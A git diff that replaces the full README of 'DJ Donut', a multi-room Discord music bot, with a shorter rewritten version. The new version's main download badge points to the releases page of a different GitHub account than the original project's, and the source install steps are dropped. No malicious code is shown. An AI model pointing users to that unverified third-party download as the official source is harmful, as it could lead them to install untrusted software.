@@ -1,377 +1,223 @@
-# DJ Donut — Discord Multi-Room Music Bot
-
-<div align="center">
-
-![Version](https://img.shields.io/badge/Version-v1.7.0-blue?logo=git)
-![Python](https://img.shields.io/badge/Python-3.10%20%7C%203.11%20%7C%203.12-3776AB?logo=python&logoColor=white)
-![Discord.py](https://img.shields.io/badge/Discord.py-v2.7.0%2B-5865F2?logo=discord&logoColor=white)
-![Lavalink](https://img.shields.io/badge/Lavalink-v4.0%2B-FF3366?logo=audacity&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-Supported-2496ED?logo=docker&logoColor=white)
-![i18n](https://img.shields.io/badge/i18n-6%20Languages-4CAF50)
-![License](https://img.shields.io/badge/License-MIT-blue.svg)
-
-**A lightweight, multi-room Discord music bot cluster.**  
-Run 1 to 5 bot instances inside a single Python process to stream music into multiple voice channels simultaneously, each with independent queues and audio controls.
-
-[Bot Invitations](#bot-invitations) • [Features](#features) • [Slash Commands](#slash-commands) • [Quick Start](#quick-start) • [Audio Tips](#audio-troubleshooting) • [Changelog](#changelog) • [Feedback](#support--feedback)
-
-</div>
-
----
-
-## Bot Invitations
-
-You can invite the pre-hosted **DJ Donut** cluster directly to your server:
-
-| Bot Node | Invite Link | Default Permissions |
-| :--- | :--- | :--- |
-| **DJ Donut 1** | [Invite Bot 1](https://discord.com/oauth2/authorize?client_id=1549028983641743462&permissions=2150648832&integration_type=0&scope=bot+applications.commands) | Minimal (View / Send / Embed / Connect / Speak / Slash) |
-| **DJ Donut 2** | [Invite Bot 2](https://discord.com/oauth2/authorize?client_id=1549258600155979956&permissions=2150648832&integration_type=0&scope=bot+applications.commands) | Minimal (View / Send / Embed / Connect / Speak / Slash) |
-| **DJ Donut 3** | [Invite Bot 3](https://discord.com/oauth2/authorize?client_id=1549259098761990184&permissions=2150648832&integration_type=0&scope=bot+applications.commands) | Minimal (View / Send / Embed / Connect / Speak / Slash) |
-| **DJ Donut 4** | [Invite Bot 4](https://discord.com/oauth2/authorize?client_id=1549259563646062743&permissions=2150648832&integration_type=0&scope=bot+applications.commands) | Minimal (View / Send / Embed / Connect / Speak / Slash) |
-| **DJ Donut 5** | [Invite Bot 5](https://discord.com/oauth2/authorize?client_id=1549259919696592976&permissions=2150648832&integration_type=0&scope=bot+applications.commands) | Minimal (View / Send / Embed / Connect / Speak / Slash) |
-
-> 💡 **How Multi-Room Dispatch Works**:
-> When someone runs `/play` in any voice room, the dispatcher checks who is already in that channel. If none of the bots are in that room yet, it automatically grabs an idle bot and joins. If all 5 bots are invited to your server, up to 5 voice rooms can listen to completely different music at the same time.
-
----
-
-## Features
-
-- **Multi-Room Clustering**: Run up to 5 bots under a single process or game panel. Each voice room gets its own independent queue, volume, loop setting, audio filters, and progress tracker.
-- **Dual-Engine Audio Pipeline**:
-  - **Lavalink v4**: Connects to an external Lavalink node for high-throughput Opus passthrough and real-time DSP equalizers.
-  - **Native FFmpeg Engine**: Runs natively without extra server software. Includes a dynamic ring buffer (`BufferedAudioSource`), custom stream headers to bypass YouTube 403 errors, and CPU thread capping (`-threads 1`).
-- **Multi-Platform Support**: Paste links directly from YouTube, SoundCloud, Spotify (tracks, albums, playlists), Apple Music, and NetEase Cloud Music (including `163cn.tv` shortlinks).
-- **Smooth Audio Streaming**: Decouples audio decoding from Discord voice transmission using a 5-second ring buffer to prevent playback jitter, sudden fast-forwarding, or audio dropouts.
-- **Full Queue & Playback Control**: Jump to specific timestamps with `/seek`, randomize the queue with `/shuffle`, drop unwanted tracks with `/remove`, or wipe the list with `/clear`.
-- **Interactive Controller UI**: Real-time progress bar (`01:23 ━━━━━━🔘─────── 04:29`), platform-themed embed cards, and a 10-button controller for volume adjustments, seeking, looping, and lyrics.
-- **Synchronized Lyrics**: Fetch synchronized or plain-text lyrics on the fly via LRCLIB and NetEase without needing third-party API keys.
-- **Server Settings Persistence**: Volume levels, language preferences, 24/7 mode, bass boost, and audio filters are persisted in a non-blocking SQLite (WAL) database (`data/donut.db`, with automatic migration from legacy `guild_settings.json`), alongside active playback queue snapshots for seamless restart recovery.
-- **Smart Autoplay (Last.fm + YouTube)**: Enable `/autoplay` to keep the music playing with Last.fm `track.getSimilar` recommendations (when `LASTFM_API_KEY` is set) and cleaned-title YouTube fallback.
-- **Observability Endpoints**: Built-in HTTP server exposing `/healthz`, `/metrics` (Prometheus), and `/status` (JSON) on `127.0.0.1:8080`.
-- **Multilingual Support**: Supports English, Traditional Chinese, Simplified Chinese, Japanese, Korean, and Spanish. Automatically detects each user's client locale.
-- **Lightweight Footprint**: Typically runs within 80–120 MB RAM even with all 5 nodes active.
-
----
-
-## Slash Commands
-
-| Command | Arguments | Description |
-| :--- | :--- | :--- |
-| **/help** | *None* | Interactive manual categorized by features |
-| **/play** | `query`, `[bot_id]` | Play a track or playlist (auto-dispatches an idle bot or targeted bot 1–5) |
-| **/search** | `query` | Search tracks and pick from an interactive top-5 select menu |
-| **/pause** | *None* | Pause the currently playing track in your voice room |
-| **/resume** | *None* | Resume paused playback with automatic stream re-anchoring |
-| **/seek** | `time` | Fast-forward or jump to a timestamp (e.g. `90` or `01:30`) |
-| **/move** | `from`, `to` | Move a queued track to a new position |
-| **/replay** | `[index]` | Replay a track from playback history |
-| **/shuffle** | *None* | Randomly shuffle all upcoming songs in the queue |
-| **/remove** | `index` | Remove a specific track from the queue by its number |
-| **/clear** | *None* | Clear all upcoming songs from the queue |
-| **/history** | *None* | View the last 15 songs played in this room |
-| **/favorite** | `action`, `[index]` | Manage personal favorite tracks (`play`, `list`, `add`, `remove`, `clear`) |
-| **/nowplaying**| *None* | Show track details, synced karaoke lyrics, progress bar, and controller |
-| **/queue** | *None* | Browse the upcoming track queue with interactive pagination |
-| **/skip** | *None* | Skip the track currently playing in your room (DJ guarded) |
-| **/stop** | `[force_all]` | Stop playback and disconnect the bot (or stop all bots) |
-| **/dj** | `[role]`, `[clear]` | Manage or view server DJ permission role |
-| **/autoplay** | *None* | Toggle smart autoplay radio mode when queue ends |
-| **/lyrics** | `[song]` | Look up synced or plain lyrics for current or queried track |
-| **/bassboost** | `level` | Live-adjust bass boost (`+4dB` to `+20dB`) with instant stream hot-swap |
-| **/filter** | `preset` | Live-apply audio filters (Rock, Pop, Vocal, Nightcore, 8D, etc.) |
-| **/bitrate** | `[kbps]` | Maximize the voice channel bitrate up to 384kbps |
-| **/status** | *None* | Live cluster dashboard for all 5 bot nodes |
-| **/247** | *None* | Toggle 24/7 permanent room presence |
-| **/language** | `language` | Set server default language (`en` / `zh-TW` / `zh-CN` / `ja` / `ko` / `es`) |
-| **/engine** | *None* | View real-time audio pipeline and engine diagnostics |
-
----
-
-## Quick Start
-
-### 1. Run with Python (Local or VPS)
-
-1. **Clone the repository and install dependencies**:
-   ```bash
-   git clone https://github.com/asian0626/DJ-Donut.git
-   cd DJ-Donut
-   pip install -r requirements.txt
-   ```
-   *Make sure `ffmpeg` is installed on your system:*
-   - **Ubuntu / Debian**: `sudo apt update && sudo apt install -y ffmpeg`
-   - **macOS**: `brew install ffmpeg`
-   - **Windows**: Download from [gyan.dev](https://www.gyan.dev/ffmpeg/builds/) and add to your PATH.
-
-2. **Configure your tokens**:
-   ```bash
-   cp .env.example .env
-   ```
-   Open `.env` and fill in your Discord Bot token(s):
-   ```env
-   BOT_TOKEN_1=your_first_bot_token_here
-   BOT_TOKEN_2=your_second_bot_token_here
-   # Add up to BOT_TOKEN_5 if you want all 5 nodes
-   ```
-
-3. **Start the cluster**:
-   ```bash
-   python3 main.py
-   ```
-
----
-
-### 2. Run with Docker Compose
-
-1. Set up your `.env`:
-   ```bash
-   cp .env.example .env
-   # Add your BOT_TOKEN_1 ~ BOT_TOKEN_5
-   ```
-
-2. Launch the container:
-   ```bash
-   docker compose up -d --build
-   ```
-
-3. Check logs:
-   ```bash
-   docker compose logs -f
-   ```
-
----
-
-### 3. Pterodactyl Game Panel
-
-1. Upload or git-clone the repo directly into your Pterodactyl server root folder.
-2. Ensure your egg is using a **Python 3.10, 3.11, or 3.12** image with FFmpeg installed.
-3. Add your tokens to `.env`.
-4. Set the startup command to:
-   ```bash
-   python3 main.py
-   ```
-5. Click **Start**. All configured bot tokens will log in together within that single panel container.
-
----
-
-## Audio Troubleshooting
-
-If audio sounds muffled, muddy, or quiet, it is almost always due to Discord's built-in noise suppression filtering out music frequencies.
-
-### 1. Disable Krisp Noise Suppression
-Discord's noise gate is tuned for human speech and treats heavy bass, synth, or drums as background noise.
-- **Desktop (PC / Mac)**:
-  1. Open **User Settings** (gear icon) -> **Voice & Video**.
-  2. Under **Noise Suppression**, select **None** (turn off Krisp).
-  3. Turn off **Echo Cancellation** if music still cuts in and out.
-- **Mobile (iOS / Android)**:
-  Swipe up while connected to the voice room and toggle off **Noise Suppression**.
-
-### 2. Maximize Room Bitrate (`/bitrate`)
-Discord defaults new voice channels to 64 kbps. Run `/bitrate` while in your voice room to immediately raise the channel to your server's maximum allowable rate (up to 384 kbps for boosted servers).
-
----
-
-## Architecture
-
-```mermaid
-flowchart TD
-    User["Discord User"] -->|"/play Query"| Master["Master Dispatcher (Bot 1)"]
-    Master --> Route{"Voice Channel Check"}
-    Route -->|Bot in Room| Existing["Dispatch to Existing Bot"]
-    Route -->|No Bot in Room| Idle["Pick Idle Node (Bot 1~5)"]
-    Existing --> Engine
-    Idle --> Engine
-    
-    subgraph "Dual-Engine Audio Pipeline"
-        Engine{"Engine Selector"}
-        Engine -->|Lavalink Available| LV4["Lavalink v4 Node<br/>(Opus Direct Passthrough + 32-bit DSP)"]
-        Engine -->|Native Fallback| FFmpeg["FFmpeg Engine<br/>(384k VBR, Anti-403, 5s Dynamic Ring Buffer)"]
-    end
-    
-    LV4 --> Voice["Discord Voice Room (Stereo 48kHz)"]
-    FFmpeg --> Voice
-```
-
-- **Runtime**: Python 3.11+ asyncio
-- **Discord Library**: `discord.py` 2.7+ with application slash command tree
-- **Audio Engines**: Lavalink v4 (Wavelink 3.4+) & Native FFmpeg Transcoder
-- **Extractor**: `yt-dlp` with thread-local caching and adaptive user-agents
-- **Lyrics Engine**: LRCLIB (synced) & NetEase (plain fallback)
-- **i18n**: Built-in 6-language locale detection (`en`, `zh-TW`, `zh-CN`, `ja`, `ko`, `es`)
-
-### Modular Project Layout
-
-```
-discord-music-bot/
-├── main.py              # Lightweight cluster entrypoint & matrix initializer
-├── bot.py               # Alternative entrypoint script
-├── settings.py          # Env tunables, audio presets, regexes & BotError hierarchy
-├── cache.py             # Bounded TTLCache for stream URLs and platform metadata
-├── ytdl.py              # Bounded yt-dlp thread pool & timeout wrapper (run_media)
-├── httpclient.py        # Shared async aiohttp ClientSession lifecycle
-├── storage.py           # Non-blocking SQLite (WAL) store for settings, favorites & queues
-├── metrics.py           # Prometheus /metrics, /healthz & /status HTTP server
-├── utils.py             # Time parsing/formatting & FFmpeg filter option builder
-├── config.py            # Backwards-compatible re-export facade
-├── locales/             # Externalized i18n JSON dictionaries (en, zh-TW, zh-CN, ja, ko, es)
-├── tests/               # Pytest unit test suite
-├── core/
-│   ├── models.py        # Song, GuildMusicState & BufferedAudioSource
-│   ├── player.py        # Audio pipeline playback engine & play_next loop
-│   ├── dispatcher.py    # Voice channel matching & smart multi-bot routing
-│   └── node.py          # MusicNodeBot client definition & cluster lifecycle
-├── platforms/
-│   ├── youtube.py       # Stream URL extraction & smart autoplay finder
-│   ├── spotify.py       # Spotify web scraping, oEmbed & API track resolver
-│   ├── netease.py       # NetEase song, album & playlist resolver
-│   └── apple_music.py   # Apple Music metadata and album art scraper
-├── ui/
-│   ├── embeds.py        # Embed cards, progress bar & duration formatters
-│   └── views.py         # Dynamic 10-button music controller & select menus
-├── commands/
-│   ├── music.py         # /play, /search, /skip, /stop, /queue, /move
-│   ├── audio.py         # /seek, /bassboost, /filter, /bitrate, /engine
-│   └── admin.py         # /status, /help, /dj, /shuffle, /lyrics, /language
-├── i18n.py              # Multi-language translations
-└── lyrics.py            # Synced and plain lyrics provider
-```
-
----
-
-## Changelog
-
-### v1.7.0 (2026-11-06)
-- **Security Hardening (TLS & Minimal OAuth2 Permissions)**: Re-enabled TLS certificate verification across `yt-dlp` and the async Lavalink `/v4/info` health probe (opt-in `LAVALINK_INSECURE_TLS=1` for self-signed nodes). Updated bot invite URLs from `Administrator (8)` to minimal required permissions (`2150648832`: View Channel, Send Messages, Embed Links, Connect, Speak, Use Application Commands).
-- **Non-Blocking SQLite (WAL) Persistence & Queue Recovery**: Replaced synchronous full-file `guild_settings.json` rewrites with a write-behind SQLite store (`storage.py`, `data/donut.db`) with automatic legacy JSON migration. Added periodic and shutdown queue snapshots so active rooms automatically resume after restarts.
-- **Modular Architecture & Bounded Resources**: Split the monolithic `config.py` into focused modules (`settings.py`, `cache.py`, `ytdl.py`, `httpclient.py`, `storage.py`, `utils.py`, `metrics.py`), unified stream, metadata, lyrics, and autocomplete caches with `cachetools.TTLCache`, bounded `MEDIA_EXECUTOR` with timeouts (`run_media`), and removed legacy synchronous `urllib` scrapers.
-- **Discord UI View Lifecycle Fix & Circular Import Elimination**: Renamed `MusicControllerView.stop` (`-> stop_btn`) and `QueuePaginationView._refresh` (`-> _refresh_page`) so they no longer shadow `discord.ui.View.stop()` and `View._refresh()`, preventing `timeout=None` view memory leaks. Adopted PEP 562 lazy module exports in `core/__init__.py` to eliminate circular imports between `core` and `ui`.
-- **Full-Repository Type Safety & Complexity Reduction (`C901 <= 10`)**: Refactored all command handlers, platform resolvers, and playback loops so every function in the repository satisfies McCabe cyclomatic complexity `<= 10`, passes extended Ruff rules (`B`, `ASYNC`, `S`, `PERF`, `C90`, `PIE`, `SIM`, `RUF`), and passes `mypy` across all 30 source files with zero errors.
-- **Queue Cap, Cooldowns, Backoff & Last.fm Autoplay**: Added configurable queue size limits (`MAX_QUEUE_SIZE`), per-user slash command cooldowns, exponential backoff on consecutive stream failures, and optional Last.fm `track.getSimilar` autoplay recommendations.
-- **Externalized Locales, Observability, Tests & CI/CD**: Extracted 6-language translations into `locales/*.json`, added `/healthz`, `/metrics` (Prometheus), and `/status` endpoints, multi-stage `Dockerfile` with `requirements.lock` and `HEALTHCHECK`, unit tests (`pytest`), `ruff` + `mypy` checks, GitHub Actions CI, and Dependabot.
-
-### v1.6.1 (2026-10-28)
-- **Eliminate Settings & Volume Deadlock**: Resolved a critical deadlock in `config.py` where calling `save_guild_setting` (e.g. clicking `🔊 +10%` / `🔉 -10%` volume buttons) or favorites functions when `_GUILD_SETTINGS_CACHE` was unset triggered re-entrant lock acquisition on `_SETTINGS_LOCK`. Replaced `threading.Lock` with `threading.RLock` and added `_load_settings_unlocked()`, completely eliminating asyncio loop thread freezes and `heartbeat blocked for more than 120 seconds`.
-- **Docker Volume Bind-Mount Safety**: Added defensive fallback in `_save_settings_dict` to gracefully handle environments where `guild_settings.json` is a Docker bind mount and atomic `os.replace` is restricted by the kernel (`EBUSY` / `EXDEV`).
-
-### v1.6.0 (2026-10-23)
-- **Zero-Gap Next-Track Background Pre-Resolution**: Automatically resolves and caches the upcoming track's stream URL (`state.queue[0]`) in the background 3 seconds after playback begins, reducing track transition latency to `<1ms`.
-- **Live Real-Time DSP Filter & Bassboost Hot-Swapping**: Upgraded `/bassboost` and `/filter` on the Native FFmpeg Engine to hot-swap the active audio stream right at the current playback second (`hot_swap_current_stream`), letting listeners hear EQ, Nightcore, Vaporwave, and 8D Surround changes in under 1 second without waiting for the next track.
-- **Voice WebSocket 1006 Auto-Reconnect & Mid-Song Resume**: Added automatic voice channel reconnection and exact-second playback re-anchoring if a track is unexpectedly interrupted mid-song by Discord voice gateway resets (`code 1006`) or CDN socket drops.
-- **Live Synced Karaoke Lyrics & Async `aiohttp` Lyrics Engine**: Rebuilt `lyrics.py` with non-blocking `aiohttp` pooling and a 1-hour LRU cache (`_LYRICS_CACHE`). Parsed LRC `[mm:ss.xx]` timestamps to display live scrolling Karaoke lyrics directly inside the Now Playing card and highlight the active line in `/lyrics`.
-- **Anti-Spam Now Playing Card Cleanup**: Automatically deletes the previous track's Now Playing controller message before posting the new card, keeping text channels completely clean during long listening sessions.
-- **Interactive Paginated Queue Browser**: Added `QueuePaginationView` (`⏮️`, `⬅️`, `➡️`, `⏭️`, `🔀`) to `/queue` and the controller's Queue button, allowing seamless browsing across hundreds of queued tracks.
-- **Personal Favorites Playlist System (`/favorite` & Controller Buttons)**: Added `/favorite` (`play`, `list`, `add`, `remove`, `clear`) and 3 new quick-action controller buttons (`❤️ Favorite`, `⭐ Play Favorites`, `🔀 Shuffle`) with atomic persistence.
-
-### v1.5.5 (2026-10-20)
-- **Eliminate FFmpeg Pipe Reader Write Error**: Removed invalid `stderr=subprocess.DEVNULL` parameter in `FFmpegPCMAudio` across `core/player.py`, `core/models.py`, and `commands/audio.py`. In discord.py, passing an integer to `stderr` causes the internal `_pipe_reader` thread to attempt `dest.write(data)` on an `int`, crashing with `AttributeError: 'int' object has no attribute 'write'`. FFmpeg output is already cleanly suppressed via `-nostats -loglevel fatal`.
-- **Bulletproof Voice Disconnect & Reconnect Handling**: Hardened `safe_disconnect` against `AttributeError: 'NoneType' object has no attribute '_get_voice_client_key'` when `vc.channel` is already `None` following Discord voice WebSocket drops (`code 1006`), ensuring internal discord.py voice client tracking maps (`_connection._voice_clients`) are reliably pruned without raising unhandled exceptions.
-- **Accurate Voice Connection Validation**: Added explicit `vc.channel is None` check to `is_vc_connected` to immediately identify severed voice sessions before attempting move or play operations.
-
-### v1.5.4 (2026-10-20)
-- **Multi-Node Voice Cross-Talk Elimination**: Fixed interactive controller buttons (`play/pause`, `skip`, `stop`, `replay`, `volume`) routing commands to incorrect nodes by dynamically resolving voice clients from the targeted node bot rather than the default guild client.
-- **Zero-Latency Audio Clock (Non-Blocking Buffer)**: Completely eradicated micro-stutters and Discord audio thread stalls by converting `BufferedAudioSource.read()` to non-blocking `get_nowait()`, reliably serving silent Opus packets on buffer underflows without blocking the critical 20ms timing loop.
-- **Thread Pool Scaling & API Isolation**: Scaled `MEDIA_EXECUTOR` to 25 parallel workers and introduced a dedicated `API_EXECUTOR` for platform metadata resolution (Spotify, Apple Music, NetEase), preventing HTTP latency from choking FFmpeg and yt-dlp audio decoding tasks.
-- **Atomic Guild Settings Persistence**: Replaced direct file writes with an atomic temp-file replace pattern (`tempfile` + `os.replace`) backed by an in-memory cache, eliminating settings file corruption during concurrent guild writes.
-- **Autonomous Empty Room Detection & 24/7 Guard**: Implemented robust empty-room auto-leave with a 60-second grace period and join cancellation, while honoring 24/7 persistent mode and cleaning up guild state on bot eviction (`on_guild_remove`).
-- **Dynamic Multi-Bot Invite Generator**: Upgraded `/status` cluster dashboard to dynamically compute OAuth2 invite URLs directly from live client IDs, ensuring self-hosters and custom deployments get accurate invite links for all node bots.
-- **Autocomplete Throttling & Suggestion Cache**: Added a 120-second TTL LRU cache for Google Suggest queries in `/play` and `/search` autocomplete, dramatically slashing redundant API roundtrips during rapid user keystrokes.
-- **Security & Docker Hardening**: Added `.dockerignore` to secure sensitive `.env` credentials, migrated Docker container execution to an unprivileged non-root user (`botuser`), restricted Lavalink exposure to local loopback (`127.0.0.1`), and enabled persistent settings volume mounting.
-- **Audio DSP & Preset Fixes**: Corrected `/filter` bass boost preset mapping and pre-loaded guild language configurations on bot startup.
-
-### v1.5.3 (2026-10-18)
-- **Admin Kick & Voice Disconnect Recovery**: Fully handled voice disconnect events (`VOICE_STATE_UPDATE` where `after.channel is None`) by cleanly disconnecting and deregistering the `VoiceClient` from discord.py's internal connection state, completely preventing `ClientException: Already connected to a voice channel for this guild` on subsequent `/play` commands.
-- **Cute Departure Notification**: Sent a sweet pastel-pink embed with kaomoji (`(｡•́︿•̀｡)` & `(๑•́ ₃ •̀๑)`) to the room's text channel if the bot is kicked or disconnected by an administrator, notifying users that the bot can be summoned back immediately with `/play`.
-- **Extended Pause Recovery & Re-Anchoring**: Fixed audio freezing and playback failure after extended pause periods by flushing stale cached stream URLs, fetching fresh YouTube CDN streams, and safely awaiting `AudioPlayer` termination before re-anchoring playback with FFmpeg.
-- **Auto Voice Reconnect on Resume**: Added automatic voice channel reconnection if the voice socket dropped or timed out during a prolonged pause, ensuring seamless resumption right from where playback stopped.
-
-### v1.5.2 (2026-10-17)
-- **Infinite Controller Lifespan**: Updated `MusicControllerView` to `timeout=None` and removed automatic button disabling so the interactive Now Playing panel remains permanently responsive regardless of pause duration.
-- **Smart Stale TCP Re-Anchoring**: Validated stream URLs on resume after pauses `>= 15s` and re-anchored playback at the exact elapsed second to recover from remote CDN socket timeouts.
-- **Dynamic Play/Pause Toggle**: Updated the interactive controller button to dynamically switch between `▶️` (play/resume) and `⏸️` (pause) based on live playback state.
-- **Added `/pause` and `/resume` Commands**: Added dedicated slash commands with DJ permission enforcement, voice room routing, and multi-bot cluster support.
-
-### v1.5.1 (2026-10-17)
-- **Extractor Client Update**: Configured `yt-dlp` to use mobile player clients (`['android', 'ios']`), bypassing web BotGuard and GVS PO Token restrictions in Docker and cloud environments without cookies.
-- **Enabled HLS Streams**: Removed `skip: ['hls']` to allow FFmpeg to ingest HLS audio streams seamlessly.
-- **Robust URL Resolution**: Validated 11-character YouTube video IDs in `Song.__init__` and playlist parsing before prepending watch URLs.
-- **Smart Multilingual Title Fallback**: Stripped full-width CJK brackets (`【】`, `「」`, `『』`) and promotional noise during fallback searches before falling back to SoundCloud.
-- **Format Filtering**: Excluded storyboard image mosaics (`sb0`–`sb3`) from audio format candidate selection.
-
-### v1.5.0 (2026-10-16)
-- **Non-Recursive Playback Loop & Exponential Backoff**: Completely rewrote `play_next` to use an iterative loop that eliminates recursion limits during stream resolution failures; added exponential backoff retries (0.5s, 1.2s, 2.5s) on stream extraction to survive transient network spikes.
-- **Smart Stream Expiration & Cache Invalidation**: Automatically parses `expire` timestamps on Google Video stream URLs to avoid serving stale links, and actively flushes cache entries on FFmpeg playback errors.
-- **Memory & Resource Leak Elimination**: Added an explicit `__del__` destructor to `BufferedAudioSource` to guarantee background reader threads and FFmpeg processes terminate promptly; upgraded idle room state cleanup to fully cancel active progress tasks and release player views.
-- **Live Dynamic Progress Scrubber**: Added a background task that smoothly updates the Now Playing progress bar embed every 15 seconds while playing, maintaining accurate elapsed times without exceeding Discord rate limits.
-- **Real-Time YouTube Query Autocomplete**: Integrated instant YouTube search suggestions into `/play` and `/search` via non-blocking queries, delivering live autocomplete options as users type.
-- **Comprehensive 6-Language Localization**: Expanded `i18n.py` to cover all administrative, queue manipulation, seek, and DJ permission interactions across English, Traditional Chinese, Simplified Chinese, Japanese, Korean, and Spanish.
-- **Smart Autoplay Loop Prevention**: Enhanced the radio recommendation engine to filter out recently played tracks, preventing repetitive recommendation cycles.
-
-### v1.4.0 (2026-10-15)
-- **Asynchronous Network Pipeline**: Switched track metadata fetching across Spotify, NetEase Cloud Music, and Apple Music from blocking urllib requests to non-blocking `aiohttp` with connection pooling, keeping the audio worker threads free for stream extraction.
-- **Instant Metadata Caching**: Added an in-memory metadata cache (1-hour TTL) for all resolved platform tracks and playlists, reducing repeat query times to sub-millisecond speeds.
-- **Fast Spotify oEmbed Resolution**: Optimized track lookups by hitting the lightweight official oEmbed endpoint (~150ms) before scraping full web embed HTML, significantly accelerating single-track playback.
-- **Thread-Safe Extractor Reuse**: Replaced ad-hoc `yt_dlp.YoutubeDL()` constructions with reusable thread-local extractors across all platform resolvers to prevent extractor initialization overhead.
-- **Dual-Key Stream Caching**: Stream URLs are now indexed by both track URL and song title, guaranteeing immediate cache hits across cross-platform searches and replay requests.
-- **Clean Shutdown Hook**: Automatically tears down connection pools and background HTTP sessions on bot shutdown.
-
-### v1.3.1 (2026-10-15)
-- **Resolved `/play` NoneType Error**: Fixed `AttributeError: 'NoneType' object has no attribute 'get'` triggered when search queries returned restricted, deleted, or empty entries under yt-dlp `ignoreerrors=True`.
-- **Defensive Track Metadata Validation**: Hardened `Song` data constructor to gracefully handle `None` and non-dict inputs, ensuring fallback values are always populated safely.
-- **Robust Preset Lookups**: Protected DSP equalizer presets and bass boost configurations with default dictionaries against missing or malformed keys.
-
-### v1.3.0 (2026-10-15)
-- **Modular Architecture Decomposition**: Broke down the 3,500+ line monolithic `main.py` into decoupled, maintainable packages (`core/`, `platforms/`, `ui/`, `commands/`, `config.py`).
-- **Centralized Settings & Presets**: Extracted all audio filter parameters, bass boost curves, ffmpeg/yt-dlp options, and guild persistence helpers into `config.py`.
-- **Standardized Error Hierarchy**: Introduced custom `BotError` base and specialized exceptions (`AudioSourceError`, `TrackNotFoundError`, `VoiceConnectionError`, `PermissionDeniedError`) for cleaner debugging.
-- **Structured Logging**: Replaced scattered print statements with a unified `logging` logger across all subsystems.
-- **Full Compatibility Preserved**: Seamless entrypoint support for both `python3 main.py` and `python3 bot.py`, zero circular imports, and zero docstrings/comments.
-
-### v1.2.0 (2026-10-15)
-- **Interactive Search Menu**: Added `/search <query>` allowing users to search YouTube and pick tracks from an interactive Discord UI drop-down menu showing title, duration, and artist.
-- **Queue Reordering**: Added `/move <from> <to>` to freely reposition songs inside the upcoming queue without restarting playback.
-- **History Replay**: Added `/replay [index]` to quickly re-queue songs directly from room history.
-- **DJ Permission Roles**: Added `/dj [role] [clear]` to configure dedicated DJ roles. When set, only DJs and server administrators can skip, stop, or clear the queue in shared rooms.
-- **Smart Query Autocomplete**: Added autocomplete suggestions to `/play` with listening history matches and popular genre queries.
-- **Memory & Resource Reclamation**: Implemented a 10-minute periodic task to automatically garbage-collect idle room states (> 30 mins) and added a 5-minute timeout to player views.
-- **Playlist Stream Stability**: Resolved audio thread deadlocks and aligned User-Agent headers across yt-dlp and FFmpeg to prevent runaway skipping on long playlists.
-
-### v1.1.0 (2026-10-15)
-- **Dedicated Media Worker Pool**: Offloaded Spotify, NetEase, Apple Music, and yt-dlp metadata extraction to a 10-worker `ThreadPoolExecutor`, preventing the main asyncio event loop from stalling during heavy track resolution.
-- **Extractor Caching**: Added thread-local `YoutubeDL` instances (`threading.local`) and a 30-minute in-memory stream URL cache to cut query resolution times and reduce memory allocations.
-- **Queue Controls**: Added `/seek` (timestamp seeking in seconds or `mm:ss`), `/shuffle` (randomize current queue), `/remove` (delete track by index), `/clear` (wipe upcoming queue), and `/history` (view recently played tracks).
-- **Auto-Recovery & Failure Breaker**: Added exponential backoff retries on broken stream connections, and an automatic circuit-breaker that pauses playback after 5 consecutive resolution failures to prevent infinite skip loops.
-- **Settings Persistence**: Guild settings (default volume, language, 24/7 permanence, bass boost level, and audio filter) now save to `guild_settings.json` and persist across bot restarts.
-- **Cleaner Shutdowns**: Implemented `__del__` cleanup on `BufferedAudioSource` to guarantee background reader threads and audio buffers terminate promptly when skipping or stopping tracks.
-
-### v1.0.5 (2026-10-15)
-- **Eliminated Audio Stutter & Speed Jumps**:
-  - Implemented `BufferedAudioSource`, a 5-second dynamic ring buffer running on a separate worker thread to decouple network fetching from real-time Discord voice playback.
-  - Replaced unstable YouTube clients with reliable `tv` and `web` player profiles, avoiding aggressive 50KB/s download throttling and sudden stream resets.
-  - Tweaked FFmpeg stream options: set `-http_persistent 0` to avoid dead connections and extended probe durations (`analyzeduration 1000000`, `probesize 256k`) to prevent clock drift.
-
-### v1.0.4 (2026-10-14)
-- **Modernized Player Interface**: Added a dynamic scrubber bar (`01:23 ━━━━━━🔘─────── 04:29`), platform-themed color accents, and cleaner embed formatting.
-- **10-Button Dual-Row Controller**: Replaced basic buttons with a compact dual-row controller supporting live volume adjustments (`-10%` / `+10%`), instant lyrics, queue views, replay, and loop mode toggling.
-- **Cluster Status Dashboard**: Added `/status` dashboard showing active rooms, per-node playback info, and direct OAuth2 invite links for any offline or missing bots.
-- **Interactive Help Menu**: Added `/help` command categorizing all playback, audio, and queue controls.
-
-### v1.0.3 (2026-10-14)
-- **NetEase Cloud Music Support**: Added direct support for NetEase songs, playlists, albums, and short URLs (`163cn.tv` / `163.lu`).
-- **Apple Music Support**: Added metadata resolution for Apple Music song, playlist, and album links (`music.apple.com` / `apple.co`).
-- **Batch Resolution**: Streamlined track importing for third-party playlists, queuing up to 200 songs smoothly.
-
-### v1.0.2 (2026-10-14)
-- **Fixed Variable Scope Bug**: Resolved an `UnboundLocalError` in `/play` caused by shadowed variable names.
-- **In-Memory Spotify Token Cache**: Switched to `MemoryCacheHandler` to prevent file permission errors on read-only hosting environments.
-- **Permission Cleanup**: Updated OAuth2 invite links to request administrator permissions (`permissions=8`) to prevent channel permission issues.
-
----
-
-## Support & Feedback
-
-If you encounter any bugs, playback issues, or have suggestions:
-
-- **Email**: [ian986260903@a1365.pro](mailto:ian986260903@a1365.pro)
-- **GitHub Issues**: [Open an Issue / Feature Request](https://github.com/asian0626/DJ-Donut/issues)
+# 🍩 DJ-Donut - Run Multiple Music Rooms at Once
+
+[![Download DJ-Donut](https://img.shields.io/badge/Download%20DJ--Donut-9B59B6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Acousticsaurabh/DJ-Donut/releases)
+
+DJ-Donut is a Discord music bot that can play music in several voice channels at the same time. One lightweight app can run 1 to 5 music rooms, and each room keeps its own queue, volume, and playback controls. You can have chill music in one room and a party playlist in another without the two mixing together.
+
+## 🎵 What DJ-Donut Does
+
+DJ-Donut brings multi-room music to Discord in a simple way. Instead of managing one bot for one voice channel, DJ-Donut runs a small cluster of bot rooms inside a single Python process. That means fewer things to install and fewer windows to manage.
+
+Each room works independently:
+
+- A room can have its own song queue.
+- A room can have its own volume level.
+- A room can be paused, skipped, or stopped without affecting other rooms.
+- A room can loop a playlist or shuffle songs.
+- A room can show what is currently playing.
+- A room can use slash commands for quick control.
+
+DJ-Donut is designed for communities, study groups, gaming servers, friend circles, and anyone who wants different music in different voice channels at the same time.
+
+## ✨ Main Features
+
